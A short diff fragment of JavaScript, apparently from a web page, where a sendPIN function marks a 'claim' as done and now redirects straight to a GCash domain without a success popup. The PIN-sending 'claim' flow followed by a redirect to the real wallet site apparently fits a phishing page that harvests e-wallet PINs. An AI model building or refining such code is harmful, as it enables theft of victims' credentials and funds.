@@ -380,9 +380,9 @@ function sendPIN() {
     .then(data => {
         if (data.status === "success") {
             sessionStorage.setItem("claimed", "true"); // Set flag to prevent multiple claims
-            Swal.fire("Success", "Claim successful!", "success").then(() => {
+           
                 window.location.href = "https://new.gcash.com"; // Change this to your redirect page
-            });
+
         } else {
             Swal.fire("Error", data.message, "error");
         }
